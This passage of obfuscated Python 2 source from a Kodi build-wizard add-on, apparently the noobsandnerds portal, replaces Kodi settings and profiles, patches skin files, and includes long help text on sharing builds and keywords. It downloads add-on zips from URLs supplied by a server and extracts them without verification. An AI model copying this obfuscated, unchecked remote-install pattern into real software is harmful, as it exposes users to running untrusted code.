     oO000o0Oo00 = xbmcgui . Dialog ( ) . yesno ( "KODI PROFILES DETECTED" , 'This build has profiles included (standard Kodi profiles, not CP Profiles), would you like to overwrite your existing profiles or keep the ones you have?' , '' , '' , nolabel = 'Keep my profiles' , yeslabel = 'Use new profiles' )
     if 46 - 46: Iii + o000O0o % II1 * i11iIiiIii - iiII11i1I1IIi
    if local != None :
     oO000o0Oo00 = 1
     if 47 - 47: ooo0O0O00 * Iii * Oo00oo0oO
    if oO000o0Oo00 == 1 :
     oo0O0 = open ( Oo00OOOOO , mode = 'w' )
     time . sleep ( 1 )
     oo0O0 . write ( Oo0ooO0O0o00o )
     time . sleep ( 1 )
     oo0O0 . close ( )
     IIIi11Ii111I1 = 0
     if 46 - 46: IIIIiiII111
  except :
   print "no profiles.xml file"
   if 42 - 42: IIii1I
   if 32 - 32: iiII11i1I1IIi - IIIIiiII111 . II1 - II1 - iiII11i1I1IIi . IIii1I
 try :
  os . rename ( os . path . join ( oo0OooOOo0 , 'guisettings.xml' ) , II )
 except :
  i11 . ok ( 'FILE MISSING' , 'No guisettings.xml could be found in your zip file. Please double check this file is a valid zip and hasn\'t become corrupt.' )
 if local != 'fresh' :
  ii1IiI = i11 . yesno ( "Keep Kodi Settings?" , 'Do you want to keep your existing KODI settings (weather, screen calibration, PVR etc.) or wipe and install the ones in this build?' , nolabel = 'Keep my settings' , yeslabel = 'Replace my settings' )
  if 73 - 73: II1 * OOO0O0O0ooooo * i11Iii
 if local == 'fresh' :
  ii1IiI = 1
  if 7 - 7: Ooo00oOo0oOo + O00ooooo00
 if ii1IiI == 1 :
  if 95 - 95: i11iIiiIii + II1 / II11iIiIIIiI - IIii1I + IIii1I
  if os . path . exists ( iiI1IiI ) :
   if 29 - 29: Oo00oo0oO % i11Iii + o0oo . O00ooooo00 + o000O0o
   try :
    print "### Attempting to remove guisettings"
    os . remove ( iiI1IiI )
    OO0OooOo = True
    if 24 - 24: OoOo0o / IIIIiiII111 * oOoO0o00OO0 - II1 / o000O0o . oooOooOOo0OO
   except :
    print "### Problem removing guisettings"
    OO0OooOo = False
    if 98 - 98: O00ooooo00 - ooo0O0O00
   try :
    print "### Attempting to replace guisettings with new"
    os . rename ( II , iiI1IiI )
    OO0OooOo = True
    if 49 - 49: o0ii1I . IIIIiiII111 . oooOooOOo0OO
   except :
    print "### Failed to replace guisettings with new"
    OO0OooOo = False
    if 9 - 9: Oo00oo0oO - Ooo00oOo0oOo * o0oo
    if 78 - 78: IIii1I / OOO0O0O0ooooo * oooOooOOo0OO / ooo0O0O00 / Iii
 if ii1IiI == 0 :
  IIIIIiI11Ii = open ( i1I1iI , mode = 'r' )
  oOo0O = IIIIIiI11Ii . read ( )
  IIIIIiI11Ii . close ( )
  if 15 - 15: i11Iii / oooOooOOo0OO
  o0oOOoOo00o = re . compile ( '<skinsettings>[\s\S]*?<\/skinsettings>' ) . findall ( oOo0O )
  i1I11IiI = re . compile ( '<skin default[\s\S]*?<\/skin>' ) . findall ( oOo0O )
  iiiiI = re . compile ( '<lookandfeel>[\s\S]*?<\/lookandfeel>' ) . findall ( oOo0O )
  IiO0o = o0oOOoOo00o [ 0 ] if ( len ( o0oOOoOo00o ) > 0 ) else ''
  oOo0Oooo = i1I11IiI [ 0 ] if ( len ( i1I11IiI ) > 0 ) else ''
  I1iiIIiI11I = iiiiI [ 0 ] if ( len ( iiiiI ) > 0 ) else ''
  if 54 - 54: i11Iii - IIii1I - o0o % IIIIiiII111 / Ooo00oOo0oOo
  if 80 - 80: i11iIiiIii % IIii1I / i11iIiiIii
  oo0O = open ( II , mode = 'r' )
  Iii1iI1iiIii = oo0O . read ( )
  oo0O . close ( )
  if 66 - 66: Iii . IIii1I * oOoO0o00OO0 - IIIIiiII111 - IIii1I
  I1Ii1iI1IiI1I = re . compile ( '<skinsettings>[\s\S]*?<\/skinsettings>' ) . findall ( Iii1iI1iiIii )
  o0OOOoO = re . compile ( '<skin default[\s\S]*?<\/skin>' ) . findall ( Iii1iI1iiIii )
  ooo0OO0OOoooOo00 = re . compile ( '<lookandfeel>[\s\S]*?<\/lookandfeel>' ) . findall ( Iii1iI1iiIii )
  oOoO = I1Ii1iI1IiI1I [ 0 ] if ( len ( I1Ii1iI1IiI1I ) > 0 ) else ''
  o0O0o0O = o0OOOoO [ 0 ] if ( len ( o0OOOoO ) > 0 ) else ''
  iiII1i1i1I1 = ooo0OO0OOoooOo00 [ 0 ] if ( len ( ooo0OO0OOoooOo00 ) > 0 ) else ''
  iIIIiIi = oOo0O . replace ( IiO0o , oOoO ) . replace ( I1iiIIiI11I , iiII1i1i1I1 ) . replace ( oOo0Oooo , o0O0o0O )
  if 28 - 28: Iii % II1
  oo0O0 = open ( i1I1iI , mode = 'w+' )
  oo0O0 . write ( str ( iIIIiIi ) )
  oo0O0 . close ( )
  if 13 - 13: Oo00oo0oO . iiII11i1I1IIi - o0o / oooOooOOo0OO - iiII11i1I1IIi - o000O0o
  if 84 - 84: Ooo00oOo0oOo
  if os . path . exists ( iiI1IiI ) :
   if 57 - 57: OOO0O0O0ooooo * IIii1I % OOO0O0O0ooooo . II1
   try :
    os . remove ( iiI1IiI )
    OO0OooOo = True
    if 53 - 53: IIIIiiII111 / o000O0o * IIIIiiII111 + o0ii1I + oooOooOOo0OO - iiII11i1I1IIi
   except :
    OO0OooOo = False
    if 16 - 16: o0oo % OoOo0o . O00ooooo00 / oOoO0o00OO0 - OOO0O0O0ooooo
  try :
   os . rename ( i1I1iI , iiI1IiI )
   os . remove ( II )
   OO0OooOo = True
   if 85 - 85: O00ooooo00 . O00ooooo00
  except :
   OO0OooOo = False
   if 16 - 16: o000O0o - II11iIiIIIiI % IIIIiiII111 . II11iIiIIIiI + oOoO0o00OO0 % i11iIiiIii
   if 59 - 59: i11iIiiIii - o0o
 if OO0OooOo == True or local == None :
  if 59 - 59: II1 * o0ii1I / OoOo0o
  try :
   IIIIIiI11Ii = open ( I11II1i , mode = 'r' )
   oOo0O = IIIIIiI11Ii . read ( )
   IIIIIiI11Ii . close ( )
   if 75 - 75: o0ii1I - II1
   Iiiiii = re . compile ( 'id="(.+?)"' ) . findall ( oOo0O )
   OOoo000o = re . compile ( 'name="(.+?)"' ) . findall ( oOo0O )
   O000OoOO0oO = re . compile ( 'version="(.+?)"' ) . findall ( oOo0O )
   iII1o00OO0 = Iiiiii [ 0 ] if ( len ( Iiiiii ) > 0 ) else ''
   Ooii = OOoo000o [ 0 ] if ( len ( OOoo000o ) > 0 ) else ''
   oO0o0oo0O0 = O000OoOO0oO [ 0 ] if ( len ( O000OoOO0oO ) > 0 ) else ''
   if 28 - 28: o0oo
   oo0O0 = open ( IIIII , mode = 'w+' )
   oo0O0 . write ( 'id="' + str ( iII1o00OO0 ) + '"\nname="' + Ooii + '"\nversion="' + oO0o0oo0O0 + '"\ngui="' + i11ii11IiI1 + '"' )
   oo0O0 . close ( )
   if 73 - 73: iiII11i1I1IIi . i11Iii - iiII11i1I1IIi % II11iIiIIIiI / i11iIiiIii / IIii1I
   IIIIIiI11Ii = open ( o0 , mode = 'r' )
   oOo0O = IIIIIiI11Ii . read ( )
   IIIIIiI11Ii . close ( )
   if 15 - 15: i11Iii * IIii1I * oooOooOOo0OO
   iIiiI1I = re . compile ( 'version="(.+?)"' ) . findall ( oOo0O )
   O0Oo000ooO00 = iIiiI1I [ 0 ] if ( len ( iIiiI1I ) > 0 ) else ''
   iIIIiIi = oOo0O . replace ( O0Oo000ooO00 , oO0o0oo0O0 )
   if 96 - 96: OoOo0o * IIii1I / Iii % II11iIiIIIiI * Ooo00oOo0oOo
   oo0O0 = open ( o0 , mode = 'w' )
   oo0O0 . write ( str ( iIIIiIi ) )
   oo0O0 . close ( )
   os . remove ( I11II1i )
   if 3 - 3: II11iIiIIIiI . iiII11i1I1IIi / i11iIiiIii + o0oo
  except :
   oo0O0 = open ( IIIII , mode = 'w+' )
   oo0O0 . write ( 'id="None"\nname="Unknown"\nversion="Unknown"\ngui="' + i11ii11IiI1 + '"' )
   oo0O0 . close ( )
   if 47 - 47: Oo00oo0oO . II11iIiIIIiI
   if 96 - 96: o0o % Ooo00oOo0oOo / i11Iii % II11iIiIIIiI / i11Iii % i11iIiiIii
 if os . path . exists ( os . path . join ( oo0OooOOo0 , 'profiles.xml' ) ) :
  os . remove ( os . path . join ( oo0OooOOo0 , 'profiles.xml' ) )
  time . sleep ( 1 )
  if 57 - 57: o0o - o0o % Ooo00oOo0oOo % iiII11i1I1IIi . o0ii1I % iiII11i1I1IIi
 if os . path . exists ( oo0OooOOo0 ) :
  os . removedirs ( oo0OooOOo0 )
  if 91 - 91: o000O0o - o0oo - iiII11i1I1IIi - IIIIiiII111 * IIii1I
 OO0ooo0OOO = xbmc . translatePath ( os . path . join ( oo0o0O00 , OO0o , 'notification.txt' ) )
 if 69 - 69: OoOo0o + IIii1I * oooOooOOo0OO + Oo00oo0oO % i11Iii - IIIIiiII111
 if os . path . exists ( OO0ooo0OOO ) :
  os . remove ( OO0ooo0OOO )
  if 83 - 83: Oo00oo0oO % o0ii1I * o0ii1I
 if OO0OooOo == True :
  Oo00O00o0 ( )
  IiII1 ( )
  if 58 - 58: OoOo0o - o0o
  if 69 - 69: o000O0o + iiII11i1I1IIi * o0ii1I * O00ooooo00 % iiII11i1I1IIi
  if 41 - 41: oooOooOOo0OO . ooo0O0O00 + II1 * IIIIiiII111 . o0ii1I
def i1iIi1iiii1ii ( ) :
 I11iii1Ii = xbmc . getSkinDir ( )
 oOOo0 = xbmc . translatePath ( os . path . join ( i1iiIII111ii , I11iii1Ii ) )
 if 96 - 96: o0oo + o000O0o % iiII11i1I1IIi
 for iiiI1IiI , OoIIi1iI , oO0Ooo0OooOOo in os . walk ( oOOo0 ) :
  if 21 - 21: Iii - i11iIiiIii - Iii
  for Oo0oO00 in oO0Ooo0OooOOo :
   if 4 - 4: o0o . Oo00oo0oO
   if 'DialogKeyboard.xml' in Oo0oO00 :
    I11iii1Ii = os . path . join ( iiiI1IiI , Oo0oO00 )
    Ii11iiI1 = open ( I11iii1Ii ) . read ( )
    oO0O = Ii11iiI1 . replace ( '<control type="label" id="310"' , '<control type="edit" id="312"' )
    Oo0oO00 = open ( I11iii1Ii , mode = 'w' )
    Oo0oO00 . write ( oO0O )
    Oo0oO00 . close ( )
    Iiii1I ( I11iii1Ii )
    if 39 - 39: II11iIiIIIiI . iiII11i1I1IIi - Iii * i11iIiiIii
    for iiIII1I11iii in range ( 48 , 58 ) :
     I1ii1Ii1 ( iiIII1I11iii , I11iii1Ii )
     if 4 - 4: Iii * OOO0O0O0ooooo - o0o
 i11 = xbmcgui . Dialog ( )
 i11 . ok ( "Skin Changes Successful" , 'A BIG thank you to Mikey1234 for this fix. The code used for this function was ported from the Xunity Maintenance add-on' )
 xbmc . executebuiltin ( 'ReloadSkin()' )
 if 72 - 72: o0o + i11Iii / o000O0o . Oo00oo0oO % o0oo / i11iIiiIii
def I1III1I1IiI ( ) :
 if i11 . yesno ( 'Convert This Skin To Kodi (Helix)?' , 'This will fix the problem with a blank on-screen keyboard showing in skins designed for Gotham (being run on Kodi). This will only affect the currently running skin.' , nolabel = 'No, Cancel' , yeslabel = 'Yes, Fix' ) :
  i1iIi1iiii1ii ( )
  if 70 - 70: Ooo00oOo0oOo * Ooo00oOo0oOo . o000O0o
  if 11 - 11: ooo0O0O00
def i1OooO00oO00o ( ) :
 if i11 . yesno ( "Hide Passwords" , "This will hide all your passwords in your" , "add-on settings, are you sure you wish to continue?" ) :
  for iiiI1IiI , OoIIi1iI , oO0Ooo0OooOOo in os . walk ( i1iiIII111ii ) :
   for Oo0oO00 in oO0Ooo0OooOOo :
    if Oo0oO00 == 'settings.xml' :
     IIII1iI1IiIiI = open ( os . path . join ( iiiI1IiI , Oo0oO00 ) ) . read ( )
     O0OO0O = re . compile ( '<setting id=(.+?)>' ) . findall ( IIII1iI1IiIiI )
     for i1II1 in O0OO0O :
      if 'pass' in i1II1 :
       if not 'option="hidden"' in i1II1 :
        try :
         OoO = i1II1 . replace ( '/' , ' option="hidden"/' )
         Oo0oO00 = open ( os . path . join ( iiiI1IiI , Oo0oO00 ) , mode = 'w' )
         Oo0oO00 . write ( str ( IIII1iI1IiIiI ) . replace ( i1II1 , OoO ) )
         Oo0oO00 . close ( )
        except :
         pass
  i11 . ok ( "Passwords Hidden" , "Your passwords will now show as stars (hidden), if you want to undo this please use the option to unhide passwords." )
  if 67 - 67: iiII11i1I1IIi * OOO0O0O0ooooo / IIIIiiII111
  if 19 - 19: O00ooooo00 - IIii1I . o0o
def iiIIi1i111i ( url ) :
 OO = 'http://noobsandnerds.com/TI/Community_Builds/guisettings.php?id=%s' % ( url )
 Ii1iI111II1I1 = oOOOOoOO0o ( OO , 10 ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
 IiiiIi1111I = re . compile ( 'guisettings="(.+?)"' ) . findall ( Ii1iI111II1I1 )
 iIIii1iiiIiiI = IiiiIi1111I [ 0 ] if ( len ( IiiiIi1111I ) > 0 ) else 'None'
 if 48 - 48: iiII11i1I1IIi . o0ii1I - ooo0O0O00
 i11II ( iIIii1iiiIiiI , local )
 if 15 - 15: o0ii1I
 if 87 - 87: o0ii1I
def O00O ( ) :
 xbmc . executebuiltin ( 'ActivateWindow(10040,"addons://install/",return)' )
 if 23 - 23: o0oo . Oo00oo0oO
 if 79 - 79: II11iIiIIIiI
def OooO0oOo ( repo_id ) :
 IIIIIiI = 1
 OO = 'http://noobsandnerds.com/TI/AddonPortal/dependencyinstall.php?id=%s' % ( repo_id )
 Ii1iI111II1I1 = oOOOOoOO0o ( OO , 10 ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
 o0ooooO0o0O = re . compile ( 'name="(.+?)"' ) . findall ( Ii1iI111II1I1 )
 iI1i111I1Ii = re . compile ( 'version="(.+?)"' ) . findall ( Ii1iI111II1I1 )
 II11iIIiiiII = re . compile ( 'repo_url="(.+?)"' ) . findall ( Ii1iI111II1I1 )
 OoOoo00Ooo00 = re . compile ( 'data_url="(.+?)"' ) . findall ( Ii1iI111II1I1 )
 oo0O00Oooo0O0 = re . compile ( 'zip_url="(.+?)"' ) . findall ( Ii1iI111II1I1 )
 OO0 = re . compile ( 'repo_id="(.+?)"' ) . findall ( Ii1iI111II1I1 )
 o00oO00O0 = o0ooooO0o0O [ 0 ] if ( len ( o0ooooO0o0O ) > 0 ) else ''
 IIIIIo0ooOoO000oO = iI1i111I1Ii [ 0 ] if ( len ( iI1i111I1Ii ) > 0 ) else ''
 oO0oOOOo0o = II11iIIiiiII [ 0 ] if ( len ( II11iIIiiiII ) > 0 ) else ''
 i1II1iII1 = OoOoo00Ooo00 [ 0 ] if ( len ( OoOoo00Ooo00 ) > 0 ) else ''
 I11II11IiI11 = oo0O00Oooo0O0 [ 0 ] if ( len ( oo0O00Oooo0O0 ) > 0 ) else ''
 O00o = OO0 [ 0 ] if ( len ( OO0 ) > 0 ) else ''
 I1Iii = xbmc . translatePath ( os . path . join ( I11i1I1I , O00o + '.zip' ) )
 IIIi1iIii1II11 = xbmc . translatePath ( os . path . join ( i1iiIII111ii , O00o ) )
 if 70 - 70: II11iIiIIIiI - Iii - Iii . o0ii1I + Ooo00oOo0oOo - Ooo00oOo0oOo
 I11 . create ( 'Installing Repository' , 'Please wait...' , '' )
 if 28 - 28: o000O0o - OoOo0o
 try :
  downloader . download ( 'https://github.com/noobsandnerds/noobsandnerds/blob/master/zips/%s/%s-0.0.0.1.zip?raw=true' % ( repo_id , repo_id ) , I1Iii , I11 )
  extract . all ( I1Iii , i1iiIII111ii , I11 )
  xbmc . executebuiltin ( 'UpdateLocalAddons' )
  xbmc . executebuiltin ( 'UpdateAddonRepos' )
 except :
  try :
   downloader . download ( oO0oOOOo0o , I1Iii , I11 )
   extract . all ( I1Iii , i1iiIII111ii , I11 )
   xbmc . executebuiltin ( 'UpdateLocalAddons' )
   xbmc . executebuiltin ( 'UpdateAddonRepos' )
  except :
   try :
    downloader . download ( I11II11IiI11 , I1Iii , I11 )
    extract . all ( I1Iii , i1iiIII111ii , I11 )
    xbmc . executebuiltin ( 'UpdateLocalAddons' )
    xbmc . executebuiltin ( 'UpdateAddonRepos' )
   except :
    try :
     if not os . path . exists ( IIIi1iIii1II11 ) :
      os . makedirs ( IIIi1iIii1II11 )
      if 91 - 91: o000O0o + o0ii1I % Ooo00oOo0oOo + o0oo
     Ii1iI111II1I1 = oOOOOoOO0o ( i1II1iII1 , 10 ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
     O0OO0O = re . compile ( 'href="(.+?)"' , re . DOTALL ) . findall ( Ii1iI111II1I1 )
     if 66 - 66: IIii1I * Ooo00oOo0oOo % iiII11i1I1IIi % o000O0o - IIIIiiII111
     for Ii1 in O0OO0O :
      ooo0ooO = xbmc . translatePath ( os . path . join ( IIIi1iIii1II11 , Ii1 ) )
      if 59 - 59: Oo00oo0oO % oooOooOOo0OO
      if oO0oo not in Ii1 and '/' not in Ii1 :
       if 21 - 21: II1 % Iii - Iii / oOoO0o00OO0 / o0ii1I
       try :
        I11 . update ( 0 , "Downloading [COLOR=yellow]" + Ii1 + '[/COLOR]' , '' , 'Please wait...' )
        downloader . download ( i1II1iII1 + Ii1 , ooo0ooO , I11 )
        if 15 - 15: i11Iii / i11Iii % II1 . OoOo0o
       except :
        print "failed to install" + Ii1
        if 93 - 93: oOoO0o00OO0 * oOoO0o00OO0 / II1
      if '/' in Ii1 and '..' not in Ii1 and 'http' not in Ii1 :
       oo0OOOoOo = i1II1iII1 + Ii1
       IIiiIIi1 ( ooo0ooO , oo0OOOoOo )
       if 6 - 6: oOoO0o00OO0 * iiII11i1I1IIi + IIii1I
    except :
     i11 . ok ( "Error downloading repository" , 'There was an error downloading[CR][COLOR=dodgerblue]' + o00oO00O0 + '[/COLOR]. Please consider updating the add-on portal with details or report the error on the forum at WWW.NOOBSANDNERDS.COM' )
     IIIIIiI = 0
     if 19 - 19: OOO0O0O0ooooo % Ooo00oOo0oOo * o0ii1I
     if 27 - 27: II11iIiIIIiI * Oo00oo0oO / i11iIiiIii - oooOooOOo0OO + Ooo00oOo0oOo
 if IIIIIiI == 1 :
  time . sleep ( 1 )
  I11 . update ( 0 , "[COLOR=yellow]" + o00oO00O0 + '[/COLOR]  [COLOR=lime]Successfully Installed[/COLOR]' , '' , 'Now installing dependencies' )
  time . sleep ( 1 )
  OO0O0ooOOO00 = 'http://noobsandnerds.com/TI/AddonPortal/downloadcount.php?id=%s' % ( repo_id )
  try :
   oOOOOoOO0o ( OO0O0ooOOO00 , 5 )
  except :
   pass
  return True
 else :
  return False
  if 43 - 43: oOoO0o00OO0 - Ooo00oOo0oOo
  if 56 - 56: oOoO0o00OO0 . O00ooooo00 / ooo0O0O00 % oooOooOOo0OO / OOO0O0O0ooooo * o0o
def oo0oOoo ( ) :
 IIi1IiII ( 'Creating A Backup To Share' ,
 '[COLOR=gold]THE OPTIONS:[/COLOR][CR]There are 3 options when choosing to create a backup, we shall explain here the differences between them:[CR][CR]'
 '[COLOR=dodgerblue]1. noobsandnerds Community Build[/COLOR] - This is by far the best way to create a build that you want to share with others, it will create a zip file for you to share that can only be used on with this add-on. The size of the zip will be incredibly small compared to other backup options out there and it will also do lots of other clever stuff too such as error checking against the Addon Portal and the addons will always be updated via the relevant developer repositories. Added to this when it comes to updating it\'s a breeze, only the new addons not already on the system will be installed and for the majority of builds Kodi won\'t even have to restart after installing![CR][CR]'
 '[COLOR=dodgerblue]2. Universal Build[/COLOR] - This was the original method created by TotalXBMC, we would really only recommend this if for some strange reason you want your build available on other inferior wizards. The zip size is much larger and every time someone wants to update their build they have to download and install the whole thing again which can be very frustrating and time consuming. The whole build is backed up in full with the exception of the packages and thumbnails folder. Just like the option above all physical paths (so long as they exist somewhere in the Kodi environment) will be changed to special paths so they work on all devices.[CR][CR]'
 '[COLOR=dodgerblue]3. Full Backup[/COLOR] - It\'s highly unlikely you will ever want to use this option and it\'s more for the geeks out there. It will create a complete backup of your setup and not do any extra clever stuff. Things like packages will remain intact as will temp cache files, be warned the size could be VERY large![CR][CR]'
 '[CR][COLOR=gold]CREATING A COMMUNITY BUILD:[/COLOR][CR][CR][COLOR=blue][B]Step 1:[/COLOR] Remove any sensitive data[/B][CR]Make sure you\'ve removed any sensitive data such as passwords and usernames in your addon_data folder.'
 '[CR][CR][COLOR=dodgerblue][B]Step 2:[/COLOR] Backup your system[/B][CR]Choose the backup option you want from the list on the previous page, if you\'re sharing this via the CP Addon then please use the noobsandnerds backup option, this will create two zip files that you need to upload to a server.'
 '[CR][CR][COLOR=dodgerblue][B]Step 3:[/COLOR] Upload the zips[/B][CR]Upload the two zip files to a server that Kodi can access, it has to be a direct link and not somewhere that asks for captcha - archive.org and copy.com are two good examples. Do not use Dropbox unless you have a paid account, they have a fair useage policy and the chances are you\'ll find within 24 hours your download has been blocked and nobody can download it. [COLOR=lime]Top Tip: [/COLOR]The vast majority of problems occur when the wrong download URL has been entered in the online form, a good download URL normally ends in "=1" or "zip=true". Please double check when you copy the URL into a web browser it immediately starts downloading without the need to press any other button.'
 '[CR][CR][COLOR=dodgerblue][B]Step 4:[/COLOR] Submit the build[/B]'
 '[CR]Create a thread on the Community Builds section of the forum at [COLOR=orange]www.noobs[/COLOR][COLOR=dodgerblue]and[/COLOR][COLOR=orange]nerds.com[/COLOR].[CR]Full details can be found on there of the template you should use when posting, once you\'ve created your support thread (NOT BEFORE) you can request to become a member of the Community Builder group and you\'ll then be able to add your build via the web form. As soon as you\'ve successfully added the details your build will be live, if you can\'t find it in the CP addon make sure you have XXX enabled (if you marked it as having adult content) and also make sure you\'re running the same version of Kodi that you said it was compatible with. If you\'re running another version then you can select the option to "show all community builds" in the addon settings and that will show even the builds that aren\'t marked as compatible with your version of Kodi.'
 '[CR][CR][COLOR=gold]PRIVATE BUILDS[/COLOR][CR]If you aren\'t interested in sharing your build with the community you can still use our system for private builds. Just follow the instructions above but you will not need to create a support thread and you WILL require a minimum of 5 useful (not spam) posts on the forum. The 5 post rule only applies to users that wish to use the private builds option. Once you have 5 posts you\'ll be able to access the web form and in there you can enter up to 3 IP addresses that you want to be able to view your build(s). Anybody caught disobeying the forum rules will be banned so please make sure you understand the forum rules before posting, we welcome everyone but there is strictly no spamming or nonsense posts just saying something like "Thanks" in order to bump up your post count. The site rules even have examples of how you can get to 5 posts without receiving a ban.' )
 if 23 - 23: O00ooooo00
 if 31 - 31: iiII11i1I1IIi - IIii1I / o0o . o0oo
def oOOo0O0Oo ( ) :
 IIi1IiII ( 'Installing a build' , '[COLOR=dodgerblue][B]Step 1 (Optional):[/COLOR] Backup your system[/B][CR]When selecting an install option you\'ll be asked if you want to create a backup - we strongly recommend creating a backup of your system in case you don\'t like the build and want to revert back. Remember your backup may be quite large so if you\'re using a device with a very small amount of storage we recommend using a USB stick or SD card as the storage location otherwise you may run out of space and the install may fail.'
 '[CR][CR][COLOR=dodgerblue][B]Step 2:[/COLOR] Choose an install method:[/B][CR][CR]-------------------------------------------------------[CR][CR][COLOR=gold]1. Overwrite my current setup & install new build:[/COLOR] This copy over the whole build[CR]As the title suggests this will overwrite your existing setup with the one created by the community builder. We recommend using the wipe option in the maintenance section before running this, that will completely wipe your existing settings and will ensure you don\'t have any conflicting data left on the device. Once you\'ve wiped please restart Kodi and install the build, you can of course use this install option 1 without wiping but you may encounter problems. If you choose to do this DO NOT bombard the community builder with questions on how to fix certain things, they will expect you to have installed over a clean setup and if you\'ve installed over another build the responsibility for bug tracking lies solely with you!'
 '[CR][CR]-------------------------------------------------------[CR][CR][COLOR=gold]2. Install:[/COLOR] Keep my library & profiles[CR]This will install a build over the top of your existing setup so you won\'t lose anything already installed in Kodi. Your library and any profiles you may have setup will also remain unchanged.'
 '[CR][CR]-------------------------------------------------------[CR][CR][COLOR=gold]3. Install:[/COLOR] Keep my library only[CR]This will do exactly the same as number 2 (above) but it will delete any profiles you may have and replace them with the ones the build author has created.'
 '[CR][CR]-------------------------------------------------------[CR][CR][COLOR=gold]4. Install:[/COLOR] Keep my profiles only[CR]Again, the same as number 2 but your library will be replaced with the one created by the build author. If you\'ve spent a long time setting up your library and have it just how you want it then use this with caution and make sure you do a backup!'
 '[CR][CR]-------------------------------------------------------[CR][CR][COLOR=dodgerblue][B]Step 3:[/COLOR] Replace or keep settings?[/B][CR]When completing the install process you\'ll be asked if you want to keep your existing Kodi settings or replace with the ones in the build. If you choose to keep your settings then only the important skin related settings are copied over from the build. All your other Kodi settings such as screen calibration, region, audio output, resolution etc. will remain intact. Choosing to replace your settings could possibly cause a few issues, unless the build author has specifically recommended you replace the settings with theirs we would always recommend keeping your own.'
 '[CR][CR][COLOR=dodgerblue][B]Step 4: [/COLOR][COLOR=red]VERY IMPORTANT[/COLOR][/B][CR]For the install to complete properly Kodi MUST force close, this means forcing it to close via your operating system rather than elegantly via the Kodi menu. By default this add-on will attempt to make your operating system force close Kodi but there are systems that will not allow this (devices that do not allow Kodi to have root permissions).'
 ' Once the final step of the install process has been completed you\'ll see a dialog explaining Kodi is attempting a force close, please be patient and give it a minute. If after a minute Kodi hasn\'t closed or restarted you will need to manually force close. The recommended solution for force closing is to go into your operating system menu and make it force close the Kodi app but if you dont\'t know how to do that you can just pull the power from the unit.'
 ' Pulling the power is fairly safe these days, on most set top boxes it\'s the only way to switch them off - they rarely have a power switch. Even though it\'s considered fairly safe nowadays you do this at your own risk and we would always recommend force closing via the operating system menu.' )
 if 50 - 50: oooOooOOo0OO * o0o + II11iIiIIIiI - iiII11i1I1IIi
 if 79 - 79: o0oo / O00ooooo00
def iIi1i1I1I ( ) :
 IIi1IiII ( 'What is a noobsandnerds keyword?' , '[COLOR=gold]WHAT IS A KEYWORD?[/COLOR][CR]The noobsandnerds keywords are based on the ingenious TLBB keyword system that was introduced years ago. It\'s nothing new and unlike certain other people out there we\'re not going to claim it as our idea. If you\'re already familiar with TLBB Keywords or even some of the copies out there like Cloudwords you will already know how this works but for those of you that don\'t have one of those devices we\'ll just go through the details...'
 '[CR][CR]Anyone in the community can make their own keywords and share them with others, it\'s a simple word you type in and then the content you uploaded to the web is downloaded and installed. Previously keywords have mostly been used for addon packs, this is a great way to get whole packs of addons in one go without the need to install a whole new build. We are taking this to the next level and will be introducing artwork packs and also addon fixes. More details will be available in the Community Portal section of the forum on www.noobsandnerds.com'
 '[CR][CR][CR][COLOR=gold]HOW DO I FIND A KEYWORD?[/COLOR][CR]The full list of noobsandnerds keywords can be found on the forum, in the Community Portal section you\'ll see a section for the keywords at the top of the page. Just find the pack you would like to install then using this addon type the keyword in when prompted (after clicking "Install a noobsandnerds keyword"). Your content will now be installed, if installing addon packs please be patient while each addon updates to the latest version directly from the developers repo.'
 '[CR][CR][CR][COLOR=gold]CAN I USE OTHER KEYWORDS?[/COLOR] (Cloudwords, TLBB etc.)[CR]Yes you can, just go to the addon settings and enter the url shortener that particular company use. Again you will find full details of supported keywords on the forum.' )
 if 35 - 35: o0o + OOO0O0O0ooooo * Ooo00oOo0oOo
 if 23 - 23: Iii * Oo00oo0oO / oooOooOOo0OO
def O0O0o0o0oo0O ( ) :
 IIi1IiII ( 'How to create a keyword?' , '[COLOR=gold]NaN MAKE IT EASY![/COLOR][CR]The keywords can now be made very simply by anyone. We\'ve not locked this down to just our addon and others can use this on similar systems for creating keywords if they want...'
 '[CR][CR][COLOR=dodgerblue][B]Step 1:[/COLOR] Use a vanilla Kodi setup[/B][CR]You will require a complete fresh install of Kodi with absolutely nothing else installed and running the default skin. Decide what kind of pack you want to create, lets say we want to create a kids pack... Add all the kid related addons you want and make sure you also have the relevant repository installed too. In the unlikely event you\'ve found an addon that doesn\'t belong in a repository that\'s fine the system will create a full backup of that addon too (just means it won\'t auto update with future updates to the addon).'
 '[CR][CR][COLOR=dodgerblue][B]Step 2:[/COLOR] Create the backup[/B][CR]Using this addon create your backup, currently only addon packs are supported but soon more packs will be added. When you create the keyword you\'ll be asked for a location to store the zip file that will be created and a name, this can be anywhwere you like and can be called whatever you want - you do not need to add the zip extension, that will automatically be added for you so in our example here we would call it "kids".'
 '[CR][CR][COLOR=dodgerblue][B]Step 3:[/COLOR] Upload the zips[/B][CR]Upload the two zip file to a server that Kodi can access, it has to be a direct link and not somewhere that asks for captcha - archive.org and copy.com are two good examples. Do not use Dropbox unless you have a paid account, they have a fair useage policy and the chances are you\'ll find within 24 hours your download has been blocked and nobody can download it.[CR][CR][COLOR=lime]Top Tip: [/COLOR]The vast majority of problems occur when the wrong download URL has been entered in the online form, a good download URL normally ends in "=1" or "zip=true". Please double check when you copy the URL into a web browser it immediately starts downloading without the need to press any other button.'
 '[CR][CR][COLOR=dodgerblue][B]Step 4:[/COLOR] Create the keyword[/B][CR]Copy the download URL to your clipboard and then go to www.urlshortbot.com. In here you need to enter the URL in the "Long URL" field and then in the "Custom Keyword" field you need to enter "noobs" (without the quotation marks) followed by your keyword. We recommend always using a random test keyword for testing because once you have a keyword you can\'t change it, also when uploading make sure it\'s a link you can edit and still keep the same URL - that way it\'s easy to keep up to date and you can still use the same keyword. In our example of kids we would set the custom keyword as "noobskids". The noobs bit is ignored and is only for helping the addon know what to look for, the user would just type in "kids" for the kids pack to be installed.' )
 if 30 - 30: OoOo0o / o000O0o / O00ooooo00 - OOO0O0O0ooooo . IIIIiiII111 - i11Iii
 if 95 - 95: OoOo0o - Oo00oo0oO
def I1ii ( ) :
